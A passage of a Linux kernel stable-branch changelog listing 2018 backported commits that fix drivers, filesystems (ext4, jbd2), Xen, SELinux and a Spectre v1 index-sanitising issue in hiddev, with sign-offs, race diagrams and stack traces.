Cc: Qiuxu Zhuo
Cc: linux-edac
Link: http://lkml.kernel.org/r/20180928213934.19890-1-tony.luck@intel.com
Signed-off-by: Greg Kroah-Hartman
commit 6ba33971125cf6b3f09be82994bda30af3d260b8
Author: Michael Jin
Date: Thu Aug 16 15:28:40 2018 -0400
EDAC, amd64: Add Family 17h, models 10h-2fh support
commit 8960de4a5ca7980ed1e19e7ca5a774d3b7a55c38 upstream.
Add new device IDs for family 17h, models 10h-2fh.
This is required by amd64\_edac\_mod in order to properly detect PCI
device functions 0 and 6.
Signed-off-by: Michael Jin
Reviewed-by: Yazen Ghannam
Cc:
Link: http://lkml.kernel.org/r/20180816192840.31166-1-mikhail.jin@gmail.com
Signed-off-by: Borislav Petkov
Signed-off-by: Greg Kroah-Hartman
commit d08463386852bb3f60ad6579d2c72e49fcc64869
Author: Breno Leitao
Date: Fri Oct 19 17:01:33 2018 -0300
HID: hiddev: fix potential Spectre v1
commit f11274396a538b31bc010f782e05c2ce3f804c13 upstream.
uref->usage\_index can be indirectly controlled by userspace, hence leading
to a potential exploitation of the Spectre variant 1 vulnerability.
This field is used as an array index by the hiddev\_ioctl\_usage() function,
when 'cmd' is either HIDIOCGCOLLECTIONINDEX, HIDIOCGUSAGES or
HIDIOCSUSAGES.
For cmd == HIDIOCGCOLLECTIONINDEX case, uref->usage\_index is compared to
field->maxusage and then used as an index to dereference field->usage
array. The same thing happens to the cmd == HIDIOC{G,S}USAGES cases, where
uref->usage\_index is checked against an array maximum value and then it is
used as an index in an array.
This is a summary of the HIDIOCGCOLLECTIONINDEX case, which matches the
traditional Spectre V1 first load:
copy\_from\_user(uref, user\_arg, sizeof(\*uref))
if (uref->usage\_index >= field->maxusage)
goto inval;
i = field->usage[uref->usage\_index].collection\_index;
return i;
This patch fixes this by sanitizing field uref->usage\_index before using it
to index field->usage (HIDIOCGCOLLECTIONINDEX) or field->value in
HIDIOC{G,S}USAGES arrays, thus, avoiding speculation in the first load.
Cc:
Signed-off-by: Breno Leitao
v2: Contemplate cmd == HIDIOC{G,S}USAGES case
Signed-off-by: Jiri Kosina
Signed-off-by: Greg Kroah-Hartman
commit fafa54248a2f33865ed87a7a392bd4c7ffc5ffc8
Author: Jason Gerecke
Date: Wed Oct 10 13:40:26 2018 -0700
HID: wacom: Work around HID descriptor bug in DTK-2451 and DTH-2452
commit 11db8173dbab7a94cf5ba5225fcedbfc0f3b7e54 upstream.
The DTK-2451 and DTH-2452 have a buggy HID descriptor which incorrectly
contains a Cintiq-like report, complete with pen tilt, rotation, twist, serial
number, etc. The hardware doesn't actually support this data but our driver
duitifully sets up the device as though it does. To ensure userspace has a
correct view of devices without updated firmware, we clean up this incorrect
data in wacom\_setup\_device\_quirks.
We're also careful to clear the WACOM\_QUIRK\_TOOLSERIAL flag since its presence
causes the driver to wait for serial number information (via
wacom\_wac\_pen\_serial\_enforce) that never comes, resulting in
the pen being non-responsive.
Signed-off-by: Jason Gerecke
Fixes: 8341720642 ("HID: wacom: Queue events with missing type/serial data for later processing")
Cc: stable@vger.kernel.org # v4.16+
Signed-off-by: Jiri Kosina
Signed-off-by: Greg Kroah-Hartman
commit 6f076021ce7e638d16ed45a0a959bdaf37f876a8
Author: Stephen Smalley
Date: Tue Sep 4 16:51:36 2018 -0400
selinux: fix mounting of cgroup2 under older policies
commit 7bb185edb0306bb90029a5fa6b9cff900ffdbf4b upstream.
commit 901ef845fa2469c ("selinux: allow per-file labeling for cgroupfs")
broke mounting of cgroup2 under older SELinux policies which lacked
a genfscon rule for cgroup2. This prevents mounting of cgroup2 even
when SELinux is permissive.
Change the handling when there is no genfscon rule in policy to
just mark the inode unlabeled and not return an error to the caller.
This permits mounting and access if allowed by policy, e.g. to
unconfined domains.
I also considered changing the behavior of security\_genfs\_sid() to
never return -ENOENT, but the current behavior is relied upon by
other callers to perform caller-specific handling.
Fixes: 901ef845fa2469c ("selinux: allow per-file labeling for cgroupfs")
CC:
Reported-by: Dmitry Vyukov
Reported-by: Waiman Long
Signed-off-by: Stephen Smalley
Tested-by: Waiman Long
Signed-off-by: Paul Moore
Signed-off-by: Greg Kroah-Hartman
commit dabb79bd260295c81438f7e2e33522c2bae7810e
Author: Theodore Ts'o
Date: Fri Oct 12 09:28:09 2018 -0400
ext4: fix use-after-free race in ext4\_remount()'s error path
commit 33458eaba4dfe778a426df6a19b7aad2ff9f7eec upstream.
It's possible for ext4\_show\_quota\_options() to try reading
s\_qf\_names[i] while it is being modified by ext4\_remount() --- most
notably, in ext4\_remount's error path when the original values of the
quota file name gets restored.
Reported-by: syzbot+a2872d6feea6918008a9@syzkaller.appspotmail.com
Signed-off-by: Theodore Ts'o
Cc: stable@kernel.org # 3.2+
Signed-off-by: Greg Kroah-Hartman
commit 798d9a4c4d37b752ab1f2961d3ea96ce00cfce03
Author: Wang Shilong
Date: Wed Oct 3 12:19:21 2018 -0400
ext4: propagate error from dquot\_initialize() in EXT4\_IOC\_FSSETXATTR
commit 182a79e0c17147d2c2d3990a9a7b6b58a1561c7a upstream.
We return most failure of dquota\_initialize() except
inode evict, this could make a bit sense, for example
we allow file removal even quota files are broken?
But it dosen't make sense to allow setting project
if quota files etc are broken.
Signed-off-by: Wang Shilong
Signed-off-by: Theodore Ts'o
Cc: stable@kernel.org
Signed-off-by: Greg Kroah-Hartman
commit c68737e3e4c3ebcdf2836719b2e5198960a1cbab
Author: Wang Shilong
Date: Wed Oct 3 10:33:32 2018 -0400
ext4: fix setattr project check in fssetxattr ioctl
commit dc7ac6c4cae3b58724c2f1e21a7c05ce19ecd5a8 upstream.
Currently, project quota could be changed by fssetxattr
ioctl, and existed permission check inode\_owner\_or\_capable()
is obviously not enough, just think that common users could
change project id of file, that could make users to
break project quota easily.
This patch try to follow same regular of xfs project
quota:
"Project Quota ID state is only allowed to change from
within the init namespace. Enforce that restriction only
if we are trying to change the quota ID state.
Everything else is allowed in user namespaces."
Besides that, check and set project id'state should
be an atomic operation, protect whole operation with
inode lock, ext4\_ioctl\_setproject() is only used for
ioctl EXT4\_IOC\_FSSETXATTR, we have held mnt\_want\_write\_file()
before ext4\_ioctl\_setflags(), and ext4\_ioctl\_setproject()
is called after ext4\_ioctl\_setflags(), we could share
codes, so remove it inside ext4\_ioctl\_setproject().
Signed-off-by: Wang Shilong
Signed-off-by: Theodore Ts'o
Reviewed-by: Andreas Dilger
Cc: stable@kernel.org
Signed-off-by: Greg Kroah-Hartman
commit 5dd65242be71bcc98979809b7bc6f3989da535a6
Author: Lukas Czerner
Date: Tue Oct 2 21:18:45 2018 -0400
ext4: initialize retries variable in ext4\_da\_write\_inline\_data\_begin()
commit 625ef8a3acd111d5f496d190baf99d1a815bd03e upstream.
Variable retries is not initialized in ext4\_da\_write\_inline\_data\_begin()
which can lead to nondeterministic number of retries in case we hit
ENOSPC. Initialize retries to zero as we do everywhere else.
Signed-off-by: Lukas Czerner
Signed-off-by: Theodore Ts'o
Fixes: bc0ca9df3b2a ("ext4: retry allocation when inline->extent conversion failed")
Cc: stable@kernel.org
Signed-off-by: Greg Kroah-Hartman
commit 34e60cb2f8ea90f0e957dec492c5bc2cca3f56d6
Author: Theodore Ts'o
Date: Tue Oct 2 18:21:19 2018 -0400
ext4: fix EXT4\_IOC\_SWAP\_BOOT
commit 18aded17492088962ef43f00825179598b3e8c58 upstream.
The code EXT4\_IOC\_SWAP\_BOOT ioctl hasn't been updated in a while, and
it's a bit broken with respect to more modern ext4 kernels, especially
metadata checksums.
Other problems fixed with this commit:
\* Don't allow installing a DAX, swap file, or an encrypted file as a
boot loader.
\* Respect the immutable and append-only flags.
\* Wait until any DIO operations are finished \*before\* calling
truncate\_inode\_pages().
\* Don't swap inode->i\_flags, since these flags have nothing to do with
the inode blocks --- and it will give the IMA/audit code heartburn
when the inode is evicted.
Signed-off-by: Theodore Ts'o
Cc: stable@kernel.org
Reported-by: syzbot+e81ccd4744c6c4f71354@syzkaller.appspotmail.com
Signed-off-by: Greg Kroah-Hartman
commit d543195430fa420cc21b20a9e6dde7aebc241f68
Author: Al Viro
Date: Sat Oct 13 00:19:13 2018 -0400
gfs2\_meta: ->mount() can get NULL dev\_name
commit 3df629d873f8683af6f0d34dfc743f637966d483 upstream.
get in sync with mount\_bdev() handling of the same
Reported-by: syzbot+c54f8e94e6bba03b04e9@syzkaller.appspotmail.com
Cc: stable@vger.kernel.org
Signed-off-by: Al Viro
Signed-off-by: Greg Kroah-Hartman
commit 08a394fe1c042826ef6646875ceea544f5c8ade2
Author: Jan Kara
Date: Fri Oct 5 18:44:40 2018 -0400
jbd2: fix use after free in jbd2\_log\_do\_checkpoint()
commit ccd3c4373eacb044eb3832966299d13d2631f66f upstream.
The code cleaning transaction's lists of checkpoint buffers has a bug
where it increases bh refcount only after releasing
journal->j\_list\_lock. Thus the following race is possible:
CPU0 CPU1
jbd2\_log\_do\_checkpoint()
jbd2\_journal\_try\_to\_free\_buffers()
\_\_journal\_try\_to\_free\_buffer(bh)
...
while (transaction->t\_checkpoint\_io\_list)
...
if (buffer\_locked(bh)) {
<-- IO completes now, buffer gets unlocked -->
spin\_unlock(&journal->j\_list\_lock);
spin\_lock(&journal->j\_list\_lock);
\_\_jbd2\_journal\_remove\_checkpoint(jh);
spin\_unlock(&journal->j\_list\_lock);
try\_to\_free\_buffers(page);
get\_bh(bh) <-- accesses freed bh
Fix the problem by grabbing bh reference before unlocking
journal->j\_list\_lock.
Fixes: dc6e8d669cf5 ("jbd2: don't call get\_bh() before calling \_\_jbd2\_journal\_remove\_checkpoint()")
Fixes: be1158cc615f ("jbd2: fold \_\_process\_buffer() into jbd2\_log\_do\_checkpoint()")
Reported-by: syzbot+7f4a27091759e2fe7453@syzkaller.appspotmail.com
CC: stable@vger.kernel.org
Reviewed-by: Lukas Czerner
Signed-off-by: Jan Kara
Signed-off-by: Theodore Ts'o
Signed-off-by: Greg Kroah-Hartman
commit 54baa22b41dcabf10d955a7a157d6477c23e1b41
Author: Jason Gunthorpe
Date: Tue Aug 14 15:33:02 2018 -0700
IB/rxe: Revise the ib\_wr\_opcode enum
commit 9a59739bd01f77db6fbe2955a4fce165f0f43568 upstream.
This enum has become part of the uABI, as both RXE and the
ib\_uverbs\_post\_send() command expect userspace to supply values from this
enum. So it should be properly placed in include/uapi/rdma.
In userspace this enum is called 'enum ibv\_wr\_opcode' as part of
libibverbs.h. That enum defines different values for IB\_WR\_LOCAL\_INV,
IB\_WR\_SEND\_WITH\_INV, and IB\_WR\_LSO. These were introduced (incorrectly, it
turns out) into libiberbs in 2015.
The kernel has changed its mind on the numbering for several of the IB\_WC
values over the years, but has remained stable on IB\_WR\_LOCAL\_INV and
below.
Based on this we can conclude that there is no real user space user of the
values beyond IB\_WR\_ATOMIC\_FETCH\_AND\_ADD, as they have never worked via
rdma-core. This is confirmed by inspection, only rxe uses the kernel enum
and implements the latter operations. rxe has clearly never worked with
these attributes from userspace. Other drivers that support these opcodes
implement the functionality without calling out to the kernel.
To make IB\_WR\_SEND\_WITH\_INV and related work for RXE in userspace we
choose to renumber the IB\_WR enum in the kernel to match the uABI that
userspace has bee using since before Soft RoCE was merged. This is an
overall simpler configuration for the whole software stack, and obviously
can't break anything existing.
Reported-by: Seth Howell
Tested-by: Seth Howell
Fixes: 8700e3e7c485 ("Soft RoCE driver")
Cc:
Signed-off-by: Jason Gunthorpe
Signed-off-by: Greg Kroah-Hartman
commit 5855f20512985c935087cc3e08c2cbeb91cce87e
Author: Artemy Kovalyov
Date: Mon Oct 15 14:13:35 2018 +0300
IB/mlx5: Fix MR cache initialization
commit 013c2403bf32e48119aeb13126929f81352cc7ac upstream.
Schedule MR cache work only after bucket was initialized.
Cc:  # 4.10
Fixes: 49780d42dfc9 ("IB/mlx5: Expose MR cache for mlx5\_ib")
Signed-off-by: Artemy Kovalyov
Reviewed-by: Majd Dibbiny
Signed-off-by: Leon Romanovsky
Signed-off-by: Jason Gunthorpe
Signed-off-by: Greg Kroah-Hartman
commit 2a270b59969ad7edb53cbf25bcdec9a373ce53b5
Author: Daniel Mack
Date: Thu Oct 11 20:32:05 2018 +0200
ASoC: sta32x: set ->component pointer in private struct
commit 747df19747bc9752cd40b9cce761e17a033aa5c2 upstream.
The ESD watchdog code in sta32x\_watchdog() dereferences the pointer
which is never assigned.
This is a regression from a1be4cead9b950 ("ASoC: sta32x: Convert to direct
regmap API usage.") which went unnoticed since nobody seems to use that ESD
workaround.
Fixes: a1be4cead9b950 ("ASoC: sta32x: Convert to direct regmap API usage.")
Signed-off-by: Daniel Mack
Signed-off-by: Mark Brown
Cc: stable@vger.kernel.org
Signed-off-by: Greg Kroah-Hartman
commit 31a02dd4ee74bf1ee9c7f71bd9161e8da46e9968
Author: Takashi Iwai
Date: Wed Oct 3 19:31:44 2018 +0200
ASoC: intel: skylake: Add missing break in skl\_tplg\_get\_token()
commit 9c80c5a8831471e0a3e139aad1b0d4c0fdc50b2f upstream.
skl\_tplg\_get\_token() misses a break in the big switch() block for
SKL\_TKN\_U8\_CORE\_ID entry.
Spotted nicely by -Wimplicit-fallthrough compiler option.
Fixes: 6277e83292a2 ("ASoC: Intel: Skylake: Parse vendor tokens to build module data")
Cc:
Signed-off-by: Takashi Iwai
Signed-off-by: Mark Brown
Signed-off-by: Greg Kroah-Hartman
commit db1af96418677cca25b94ad23133c69da447b609
Author: Dan Williams
Date: Thu Oct 4 16:32:08 2018 -0700
libnvdimm, pmem: Fix badblocks population for 'raw' namespaces
commit 91ed7ac444ef749603a95629a5ec483988c4f14b upstream.
The driver is only initializing bb\_res in the devm\_memremap\_pages()
paths, but the raw namespace case is passing an uninitialized bb\_res to
nvdimm\_badblocks\_populate().
Fixes: e8d513483300 ("memremap: change devm\_memremap\_pages interface...")
Cc:
Cc: Christoph Hellwig
Reported-by: Jacek Zloch
Reported-by: Krzysztof Rusocki
Reviewed-by: Vishal Verma
Signed-off-by: Dan Williams
Signed-off-by: Greg Kroah-Hartman
commit 847179b1261a2d27970b966a8dc72cdb0483f783
Author: Dan Williams
Date: Thu Sep 27 15:01:55 2018 -0700
libnvdimm, region: Fail badblocks listing for inactive regions
commit 5d394eee2c102453278d81d9a7cf94c80253486a upstream.
While experimenting with region driver loading the following backtrace
was triggered:
INFO: trying to register non-static key.
the code is fine but needs lockdep annotation.
turning off the locking correctness validator.
[..]
Call Trace:
dump\_stack+0x85/0xcb
register\_lock\_class+0x571/0x580
? \_\_lock\_acquire+0x2ba/0x1310
? kernfs\_seq\_start+0x2a/0x80
\_\_lock\_acquire+0xd4/0x1310
? dev\_attr\_show+0x1c/0x50
? \_\_lock\_acquire+0x2ba/0x1310
? kernfs\_seq\_start+0x2a/0x80
? lock\_acquire+0x9e/0x1a0
lock\_acquire+0x9e/0x1a0
? dev\_attr\_show+0x1c/0x50
badblocks\_show+0x70/0x190
? dev\_attr\_show+0x1c/0x50
dev\_attr\_show+0x1c/0x50
This results from a missing successful call to devm\_init\_badblocks()
from nd\_region\_probe(). Block attempts to show badblocks while the
region is not enabled.
Fixes: 6a6bef90425e ("libnvdimm: add mechanism to publish badblocks...")
Cc:
Reviewed-by: Johannes Thumshirn
Reviewed-by: Dave Jiang
Signed-off-by: Dan Williams
Signed-off-by: Greg Kroah-Hartman
commit e31a8418c8df7e6771414f99ed3d95ba8aca4e05
Author: Alexander Duyck
Date: Tue Sep 25 13:53:02 2018 -0700
libnvdimm: Hold reference on parent while scheduling async init
commit b6eae0f61db27748606cc00dafcfd1e2c032f0a5 upstream.
Unlike asynchronous initialization in the core we have not yet associated
the device with the parent, and as such the device doesn't hold a reference
to the parent.
In order to resolve that we should be holding a reference on the parent
until the asynchronous initialization has completed.
Cc:
Fixes: 4d88a97aa9e8 ("libnvdimm: ...base ... infrastructure")
Signed-off-by: Alexander Duyck
Signed-off-by: Dan Williams
Signed-off-by: Greg Kroah-Hartman
commit 1ebefc8202c86b538abc6deaabf3c2ded4ad1089
Author: Christian Lamparter
Date: Sun Oct 14 23:28:50 2018 +0200
dmaengine: ppc4xx: fix off-by-one build failure
commit 27d8d2d7a9b7eb05c4484b74b749eaee7b50b845 upstream.
There are two poly\_store, but one should have been poly\_show.
|adma.c:4382:16: error: conflicting types for 'poly\_store'
| static ssize\_t poly\_store(struct device\_driver \*dev, const char \*buf,
| ^~~~~~~~~~
|adma.c:4363:16: note: previous definition of 'poly\_store' was here
| static ssize\_t poly\_store(struct device\_driver \*dev, char \*buf)
| ^~~~~~~~~~
CC: stable@vger.kernel.org
Fixes: 13efe1a05384 ("dmaengine: ppc4xx: remove DRIVER\_ATTR() usage")
Signed-off-by: Christian Lamparter
Signed-off-by: Vinod Koul
Signed-off-by: Greg Kroah-Hartman
commit 389d46234082648806d8df0f526253761b56c583
Author: Stefan Nuernberger
Date: Mon Sep 17 19:46:53 2018 +0200
net/ipv4: defensive cipso option parsing
commit 076ed3da0c9b2f88d9157dbe7044a45641ae369e upstream.
commit 40413955ee26 ("Cipso: cipso\_v4\_optptr enter infinite loop") fixed
a possible infinite loop in the IP option parsing of CIPSO. The fix
assumes that ip\_options\_compile filtered out all zero length options and
that no other one-byte options beside IPOPT\_END and IPOPT\_NOOP exist.
While this assumption currently holds true, add explicit checks for zero
length and invalid length options to be safe for the future. Even though
ip\_options\_compile should have validated the options, the introduction of
new one-byte options can still confuse this code without the additional
checks.
Signed-off-by: Stefan Nuernberger
Cc: David Woodhouse
Cc: Simon Veith
Cc: stable@vger.kernel.org
Acked-by: Paul Moore
Signed-off-by: David S. Miller
Signed-off-by: Greg Kroah-Hartman
commit a11eb15106171962e480d318beed386c0260f659
Author: Luca Coelho
Date: Sat Oct 13 09:46:08 2018 +0300
iwlwifi: mvm: check return value of rs\_rate\_from\_ucode\_rate()
commit 3d71c3f1f50cf309bd20659422af549bc784bfff upstream.
The rs\_rate\_from\_ucode\_rate() function may return -EINVAL if the rate
is invalid, but none of the callsites check for the error, potentially
making us access arrays with index IWL\_RATE\_INVALID, which is larger
than the arrays, causing an out-of-bounds access. This will trigger
KASAN warnings, such as the one reported in the bugzilla issue
mentioned below.
This fixes https://bugzilla.kernel.org/show\_bug.cgi?id=200659
Cc: stable@vger.kernel.org
Signed-off-by: Luca Coelho
Signed-off-by: Kalle Valo
Signed-off-by: Greg Kroah-Hartman
commit 255768cf1b571a4f8d0ac78054ccb8793f3e4ca8
Author: Felix Fietkau
Date: Mon Oct 1 13:24:00 2018 +0200
mt76: mt76x2: fix multi-interface beacon configuration
commit 5289976ad887deb07c76df7eecf553c264aeebed upstream.
If the first virtual interface is a station (or an AP with beacons
temporarily disabled), the beacon of the second interface needs to
occupy hardware beacon slot 0.
For some reason the beacon index was incorrectly masked with the
virtual interface beacon mask, which prevents the secondary
interface from sending beacons unless the first one also does.
Cc: stable@vger.kernel.org
Signed-off-by: Felix Fietkau
Signed-off-by: Greg Kroah-Hartman
commit 7ea2dd519f59426fadfaf6c48670426bfbda2cb6
Author: Yoshihiro Shimoda
Date: Tue Oct 2 20:57:44 2018 +0900
usb: gadget: udc: renesas\_usb3: Fix b-device mode for "workaround"
commit afc92514a34c7414b28047b1205a6b709103c699 upstream.
If the "workaround\_for\_vbus" is true, the driver will not call
usb\_disconnect(). So, since the controller keeps some registers'
value, the driver doesn't re-enumarate suitable speed after
the b-device mode is disabled. To fix the issue, this patch
adds usb\_disconnect() calling in renesas\_usb3\_b\_device\_write()
if workaround\_for\_vbus is true.
Fixes: 43ba968b00ea ("usb: gadget: udc: renesas\_usb3: add debugfs to set the b-device mode")
Cc:  # v4.14+
Signed-off-by: Yoshihiro Shimoda
Signed-off-by: Felipe Balbi
Signed-off-by: Greg Kroah-Hartman
commit 4d5f0d220a293d73bf683b0fd09f91be152e5b72
Author: Adam Thomson
Date: Fri Sep 21 16:04:11 2018 +0100
usb: typec: tcpm: Fix APDO PPS order checking to be based on voltage
commit 1b6af2f58c2b1522e0804b150ca95e50a9e80ea7 upstream.
Current code mistakenly checks against max current to determine
order but this should be max voltage. This commit fixes the issue
so order is correctly determined, thus avoiding failure based on
a higher voltage PPS APDO having a lower maximum current output,
which is actually valid.
Fixes: 2eadc33f40d4 ("typec: tcpm: Add core support for sink side PPS")
Cc:
Signed-off-by: Adam Thomson
Reviewed-by: Heikki Krogerus
Reviewed-by: Guenter Roeck
Signed-off-by: Greg Kroah-Hartman
commit d0e02f4b273b12e624ff4eded9a7abcb102fbffe
Author: Shuah Khan (Samsung OSG)
Date: Thu Oct 18 10:19:29 2018 -0600
usbip:vudc: BUG kmalloc-2048 (Not tainted): Poison overwritten
commit e28fd56ad5273be67d0fae5bedc7e1680e729952 upstream.
In rmmod path, usbip\_vudc does platform\_device\_put() twice once from
platform\_device\_unregister() and then from put\_vudc\_device().
The second put results in:
BUG kmalloc-2048 (Not tainted): Poison overwritten error or
BUG: KASAN: use-after-free in kobject\_put+0x1e/0x230 if KASAN is
enabled.
[ 169.042156] calling init+0x0/0x1000 [usbip\_vudc] @ 1697
[ 169.042396] =============================================================================
[ 169.043678] probe of usbip-vudc.0 returned 1 after 350 usecs
[ 169.044508] BUG kmalloc-2048 (Not tainted): Poison overwritten
[ 169.044509] -----------------------------------------------------------------------------
...
[ 169.057849] INFO: Freed in device\_release+0x2b/0x80 age=4223 cpu=3 pid=1693
[ 169.057852] kobject\_put+0x86/0x1b0
[ 169.057853] 0xffffffffc0c30a96
[ 169.057855] \_\_x64\_sys\_delete\_module+0x157/0x240
Fix it to call platform\_device\_del() instead and let put\_vudc\_device() do
the platform\_device\_put().
Reported-by: Randy Dunlap
Signed-off-by: Shuah Khan (Samsung OSG)
Cc:
Signed-off-by: Greg Kroah-Hartman
commit fc988a353d59e3d679a694b86ddc00a25fadb515
Author: Lubomir Rintel
Date: Sat Oct 6 22:12:32 2018 +0200
libertas: don't set URB\_ZERO\_PACKET on IN USB transfer
commit 6528d88047801b80d2a5370ad46fb6eff2f509e0 upstream.
The USB core gets rightfully upset:
usb 1-1: BOGUS urb flags, 240 --> 200
WARNING: CPU: 0 PID: 60 at drivers/usb/core/urb.c:503 usb\_submit\_urb+0x2f8/0x3ed
Modules linked in:
CPU: 0 PID: 60 Comm: kworker/0:3 Not tainted 4.19.0-rc6-00319-g5206d00a45c7 #39
Hardware name: OLPC XO/XO, BIOS OLPC Ver 1.00.01 06/11/2014
Workqueue: events request\_firmware\_work\_func
EIP: usb\_submit\_urb+0x2f8/0x3ed
Code: 75 06 8b 8f 80 00 00 00 8d 47 78 89 4d e4 89 55 e8 e8 35 1c f6 ff 8b 55 e8 56 52 8b 4d e4 51 50 68 e3 ce c7 c0 e8 ed 18 c6 ff <0f> 0b 83 c4 14 80 7d ef 01 74 0a 80 7d ef 03 0f 85 b8 00 00 00 8b
EAX: 00000025 EBX: ce7d4980 ECX: 00000000 EDX: 00000001
ESI: 00000200 EDI: ce7d8800 EBP: ce7f5ea8 ESP: ce7f5e70
DS: 007b ES: 007b FS: 0000 GS: 00e0 SS: 0068 EFLAGS: 00210292
CR0: 80050033 CR2: 00000000 CR3: 00e80000 CR4: 00000090
Call Trace:
? if\_usb\_fw\_timeo+0x64/0x64
\_\_if\_usb\_submit\_rx\_urb+0x85/0xe6
? if\_usb\_fw\_timeo+0x64/0x64
if\_usb\_submit\_rx\_urb\_fwload+0xd/0xf
if\_usb\_prog\_firmware+0xc0/0x3db
? \_request\_firmware+0x54/0x47b
? \_request\_firmware+0x89/0x47b
? if\_usb\_probe+0x412/0x412
lbs\_fw\_loaded+0x55/0xa6
? debug\_smp\_processor\_id+0x12/0x14
helper\_firmware\_cb+0x3c/0x3f
request\_firmware\_work\_func+0x37/0x6f
process\_one\_work+0x164/0x25a
worker\_thread+0x1c4/0x284
kthread+0xec/0xf1
? cancel\_delayed\_work\_sync+0xf/0xf
? kthread\_create\_on\_node+0x1a/0x1a
ret\_from\_fork+0x2e/0x38
---[ end trace 3ef1e3b2dd53852f ]---
Cc: stable@vger.kernel.org
Signed-off-by: Lubomir Rintel
Signed-off-by: Kalle Valo
Signed-off-by: Greg Kroah-Hartman
commit 9c47f44d0a93368e22893f6368fc57a44143d468
Author: Juergen Gross
Date: Thu Oct 25 09:54:15 2018 +0200
xen/pvh: don't try to unplug emulated devices
commit e6111161c0a02d58919d776eec94b313bb57911f upstream.
A Xen PVH guest has no associated qemu device model, so trying to
unplug any emulated devices is making no sense at all.
Bail out early from xen\_unplug\_emulated\_devices() when running as PVH
guest. This will avoid issuing the boot message:
[ 0.000000] Xen Platform PCI: unrecognised magic value
Cc:  # 4.11
Signed-off-by: Juergen Gross
Reviewed-by: Boris Ostrovsky
Signed-off-by: Juergen Gross
Signed-off-by: Greg Kroah-Hartman
commit 9006cb39229305f4943d082cd0b16dcd7bd953cd
Author: Roger Pau Monne
Date: Tue Oct 9 12:32:37 2018 +0200
xen/pvh: increase early stack size
commit 7deecbda3026f5e2a8cc095d7ef7261a920efcf2 upstream.
While booting on an AMD EPYC box the stack canary would detect stack
overflows when using the current PVH early stack size (256). Switch to
using the value defined by BOOT\_STACK\_SIZE, which prevents the stack
overflow.
Cc:  # 4.11
Signed-off-by: Roger Pau Monné
Reviewed-by: Juergen Gross
Signed-off-by: Juergen Gross
Signed-off-by: Greg Kroah-Hartman
commit f91721a7895e48b48ffc33dfb81efa46039259ea
Author: Juergen Gross
Date: Mon Oct 1 07:57:42 2018 +0200
xen: make xen\_qlock\_wait() nestable
commit a856531951dc8094359dfdac21d59cee5969c18e upstream.
xen\_qlock\_wait() isn't safe for nested calls due to interrupts. A call
of xen\_qlock\_kick() might be ignored in case a deeper nesting level
was active right before the call of xen\_poll\_irq():
CPU 1: CPU 2:
spin\_lock(lock1)
spin\_lock(lock1)
-> xen\_qlock\_wait()
-> xen\_clear\_irq\_pending()
Interrupt happens
spin\_unlock(lock1)
-> xen\_qlock\_kick(CPU 2)
spin\_lock\_irqsave(lock2)
spin\_lock\_irqsave(lock2)
-> xen\_qlock\_wait()
-> xen\_clear\_irq\_pending()
clears kick for lock1
-> xen\_poll\_irq()
spin\_unlock\_irq\_restore(lock2)
-> xen\_qlock\_kick(CPU 2)
wakes up
spin\_unlock\_irq\_restore(lock2)
IRET
resumes in xen\_qlock\_wait()
-> xen\_poll\_irq()
never wakes up
The solution is to disable interrupts in xen\_qlock\_wait() and not to
poll for the irq in case xen\_qlock\_wait() is called in nmi context.
Cc: stable@vger.kernel.org
Cc: Waiman.Long@hp.com
Cc: peterz@infradead.org
Signed-off-by: Juergen Gross
Reviewed-by: Jan Beulich
Signed-off-by: Juergen Gross
Signed-off-by: Greg Kroah-Hartman
commit 2c2395aaa9ba3ba50c79bf138ae5b385e42f0631
Author: Juergen Gross
Date: Mon Oct 1 07:57:42 2018 +0200
xen: fix race in xen\_qlock\_wait()
commit 2ac2a7d4d9ff4e01e36f9c3d116582f6f655ab47 upstream.
In the following situation a vcpu waiting for a lock might not be
woken up from xen\_poll\_irq():
CPU 1: CPU 2: CPU 3:
takes a spinlock
tries to get lock
-> xen\_qlock\_wait()
frees the lock
-> xen\_qlock\_kick(cpu2)
-> xen\_clear\_irq\_pending()
takes lock again
tries to get lock
-> \*lock = \_Q\_SLOW\_VAL
-> \*lock == \_Q\_SLOW\_VAL ?
-> xen\_poll\_irq()
frees the lock
-> xen\_qlock\_kick(cpu3)
And cpu 2 will sleep forever.
This can be avoided easily by modifying xen\_qlock\_wait() to call
xen\_poll\_irq() only if the related irq was not pending and to call
xen\_clear\_irq\_pending() only if it was pending.
Cc: stable@vger.kernel.org
Cc: Waiman.Long@hp.com
Cc: peterz@infradead.org
Signed-off-by: Juergen Gross
Reviewed-by: Jan Beulich
Signed-off-by: Juergen Gross
Signed-off-by: Greg Kroah-Hartman
commit 726a8d0ae0f969e1ff8aec3d1aabbc83dda207ef
Author: Boris Ostrovsky
Date: Sun Oct 7 16:05:38 2018 -0400
xen/balloon: Support xend-based toolstack
commit 3aa6c19d2f38be9c6e9a8ad5fa8e3c9d29ee3c35 upstream.
Xend-based toolstacks don't have static-max entry in xenstore. The
equivalent node for those toolstacks is memory\_static\_max.
Fixes: 5266b8e4445c (xen: fix booting ballooned down hvm guest)
Signed-off-by: Boris Ostrovsky
Cc:  # 4.13
Reviewed-by: Juergen Gross
Signed-off-by: Juergen Gross
Signed-off-by: Greg Kroah-Hartman
commit a49e27c0efe5a8f283fc13034fb2c45b32d78f64
Author: Vasilis Liaskovitis
Date: Mon Oct 15 15:25:08 2018 +0200
xen/blkfront: avoid NULL blkfront\_info dereference on device removal
commit f92898e7f32e3533bfd95be174044bc349d416ca upstream.
If a block device is hot-added when we are out of grants,
gnttab\_grant\_foreign\_access fails with -ENOSPC (log message "28
granting access to ring page") in this code path:
talk\_to\_blkback ->
setup\_blkring ->
xenbus\_grant\_ring ->
gnttab\_grant\_foreign\_access
and the failing path in talk\_to\_blkback sets the driver\_data to NULL:
destroy\_blkring:
blkif\_free(info, 0);
mutex\_lock(&blkfront\_mutex);
free\_info(info);
mutex\_unlock(&blkfront\_mutex);
dev\_set\_drvdata(&dev->dev, NULL);
This results in a NULL pointer BUG when blkfront\_remove and blkif\_free
try to access the failing device's NULL struct blkfront\_info.
Cc: stable@vger.kernel.org # 4.5 and later
Signed-off-by: Vasilis Liaskovitis
Reviewed-by: Roger Pau Monné
Signed-off-by: Konrad Rzeszutek Wilk
Signed-off-by: Jens Axboe
Signed-off-by: Greg Kroah-Hartman
commit a76ef635cb229512a29f27c6a1131f3b7e19084c
Author: Dr. Greg Wettstein
Date: Mon Sep 17 18:53:33 2018 -0400
tpm: Restore functionality to xen vtpm driver.
commit e487a0f52301293152a6f8c4e217f2a11dd808e3 upstream.
Functionality of the xen-tpmfront driver was lost secondary to
the introduction of xenbus multi-page support in commit ccc9d90a9a8b
